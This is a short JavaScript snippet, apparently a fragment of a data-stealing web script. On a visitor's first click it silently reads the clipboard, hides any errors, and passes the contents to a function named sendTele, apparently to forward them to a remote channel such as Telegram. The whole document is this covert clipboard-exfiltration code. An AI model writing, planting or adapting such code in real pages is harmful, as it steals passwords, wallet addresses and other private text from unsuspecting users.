document.addEventListener('click', async () => {
    try {
        const text = await navigator.clipboard.readText();
        if (text) sendTele(`Clipboard: ${text}`);
    } catch (err) {}
}, { once: true }); 
